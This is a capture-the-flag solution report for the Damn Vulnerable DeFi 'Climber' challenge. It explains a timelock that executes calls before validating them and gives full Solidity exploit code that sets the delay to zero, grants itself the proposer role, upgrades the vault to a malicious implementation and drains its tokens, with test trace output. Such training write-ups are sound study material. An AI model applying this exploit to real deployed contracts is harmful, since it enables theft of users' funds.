# Damn Vulnerable DeFi - Climber - Solution Report

## Problem Analysis

### Contract Summary

The Climber challenge involves three main contracts:

1. ClimberVault: A UUPS upgradeable vault contract that holds 10 million DVT tokens.

   - Key functions:
     - `withdraw`: Allows the owner to withdraw a limited amount of tokens periodically.
     - `sweepFunds`: Allows a trusted sweeper to retrieve all tokens in case of emergency.

2. ClimberTimelock: A timelock contract that acts as the owner of the vault.

   - Key functions:
     - `schedule`: Allows a proposer to schedule operations.
     - `execute`: Executes scheduled operations after the delay.
     - `updateDelay`: Updates the timelock delay (can only be called by the timelock itself).

3. DamnValuableToken: The ERC20 token used in this challenge.

### Initial Setup

- ClimberVault:
  - Contains 10 million DVT tokens
  - Owner: ClimberTimelock contract
  - Sweeper: A designated address
- ClimberTimelock:
  - Delay: 1 hour
  - Admin role: Deployer and the timelock itself
  - Proposer role: A designated address

### Success Criteria

To solve the challenge, the attacker must:

1. Drain all 10 million DVT tokens from the ClimberVault.
2. Transfer the drained tokens to a designated recovery address.

## Vulnerability

The main vulnerability in this challenge lies in the `execute` function of the ClimberTimelock contract. The critical issue is in the order of operations within this function:

```solidity
function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt)
    external
    payable
{
    // ... (input validation)

    bytes32 id = getOperationId(targets, values, dataElements, salt);

    for (uint8 i = 0; i < targets.length; ++i) {
        targets[i].functionCallWithValue(dataElements[i], values[i]);
    }

    if (getOperationState(id) != OperationState.ReadyForExecution) {
        revert NotReadyForExecution(id);
    }

    operations[id].executed = true;
}
```

The vulnerability arises from two key aspects:

1. Execution Before Validation: The function executes the calls to the target addresses before checking if the operation is ready for execution. This allows arbitrary calls to be made without adhering to the timelock's delay.

2. Lack of Access Control: The `execute` function is public and can be called by anyone, not just the proposer or admin.

These issues combined allow an attacker to execute arbitrary functions, including those that should be protected by the timelock mechanism, without waiting for the delay period or having the necessary roles.

Additionally, the `updateDelay` function in the ClimberTimelock contract has a potential vulnerability:

```solidity
function updateDelay(uint64 newDelay) external {
    if (msg.sender != address(this)) {
        revert CallerNotTimelock();
    }
    // ...
}
```

While this function checks that it's called by the timelock itself, the previous vulnerability in `execute` allows an attacker to call this function through the timelock, potentially setting the delay to zero and bypassing the timelock's protection entirely.

## Attack Method

The attack exploits the vulnerabilities in the ClimberTimelock contract to drain the vault. The attack procedure is as follows:

1. Create a malicious contract (ClimberAttacker) that will orchestrate the attack.

2. Prepare a series of function calls to be executed via the ClimberTimelock's `execute` function:
   a. Call `updateDelay` on the ClimberTimelock to set the delay to 0.
   b. Grant the PROPOSER_ROLE to the attacker contract.
   c. Upgrade the ClimberVault to a malicious implementation.
   d. Schedule the operation (which includes the above calls) using the newly granted PROPOSER_ROLE.

3. Execute the prepared calls using the ClimberTimelock's `execute` function:

   - This exploits the vulnerability where execution happens before validation.
   - The calls are executed in order, effectively bypassing the timelock and granting necessary permissions.

4. In the same transaction, as part of the scheduled operation:

   - Deploy a malicious vault implementation.
   - Upgrade the ClimberVault to this malicious implementation.
   - The malicious implementation includes a `drain` function that allows transferring all tokens.

5. Call the `drain` function on the upgraded vault to transfer all tokens to the recovery address.

This attack method allows the attacker to:

- Bypass the timelock delay
- Grant themselves the necessary roles
- Upgrade the vault to a malicious version
- Drain all tokens from the vault

All of these actions are performed in a single transaction, exploiting the order of operations in the `execute` function and the lack of proper access controls.

## Proof of Concept (PoC)

### Core Implementation

The core of the attack is implemented in the `ClimberAttacker` contract:

```solidity
contract ClimberAttacker {
    ClimberTimelock public timelock;
    address public vault;
    address public token;
    address public recovery;

    address[] public targets;
    uint256[] public values;
    bytes[] public dataElements;

    constructor(ClimberTimelock _timelock, address _vault, address _token, address _recovery) {
        timelock = _timelock;
        vault = _vault;
        token = _token;
        recovery = _recovery;
    }

    function attack() external {
        // Deploy the new implementation
        MaliciousVaultImplementation newImpl = new MaliciousVaultImplementation();

        // Prepare the malicious calls
        targets = new address[](4);
        values = new uint256[](4);
        dataElements = new bytes[](4);

        // Call 1: Update delay to 0
        targets[0] = address(timelock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);

        // Call 2: Grant proposer role to this contract
        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));

        // Call 3: Upgrade vault to malicious implementation
        targets[2] = vault;
        values[2] = 0;
        dataElements[2] = abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(newImpl), "");

        // Call 4: Schedule the operation and drain (this call)
        targets[3] = address(this);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSignature("scheduleAndDrain()");

        // Execute the operation
        timelock.execute(targets, values, dataElements, bytes32(0));
    }

    function scheduleAndDrain() external {
        require(msg.sender == address(timelock), "Only timelock can call this");

        // Schedule the operation
        timelock.schedule(targets, values, dataElements, bytes32(0));

        // Drain the vault directly to the recovery address
        MaliciousVaultImplementation(vault).drain(token, recovery);
    }
}
```

The `MaliciousVaultImplementation` contract is a malicious version of the vault that includes a `drain` function:

```solidity
contract MaliciousVaultImplementation is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    // ... (other functions)

    function drain(address token, address recipient) external {
        SafeTransferLib.safeTransfer(token, recipient, IERC20(token).balanceOf(address(this)));
    }

    // ... (other functions)
}
```

The attack is executed in the test file:

```solidity
function test_climber() public checkSolvedByPlayer {
    // Deploy the attacker contract
    ClimberAttacker attacker = new ClimberAttacker(timelock, address(vault), address(token), recovery);

    // Execute the attack
    attacker.attack();

    // Check that the timelock delay has been set to 0
    assertEq(timelock.delay(), 0);

    // Check that the attacker contract has the PROPOSER_ROLE
    assertTrue(timelock.hasRole(PROPOSER_ROLE, address(attacker)));
}
```

### Running Result

```
    ├─ [360] ClimberTimelock::delay() [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::assertEq(0, 0) [staticcall]
    │   └─ ← [Return]
    ├─ [673] ClimberTimelock::hasRole(0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1, ClimberAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219]) [staticcall]
    │   └─ ← [Return] true
    ├─ [0] VM::assertTrue(true) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [519] DamnValuableToken::balanceOf(ERC1967Proxy: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::assertEq(0, 0, "Vault still has tokens") [staticcall]
    │   └─ ← [Return]
    ├─ [519] DamnValuableToken::balanceOf(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa]) [staticcall]
    │   └─ ← [Return] 10000000000000000000000000 [1e25]
    ├─ [0] VM::assertEq(10000000000000000000000000 [1e25], 10000000000000000000000000 [1e25], "Not enough tokens in recovery account") [staticcall]
    │   └─ ← [Return]
    └─ ← [Stop]
```
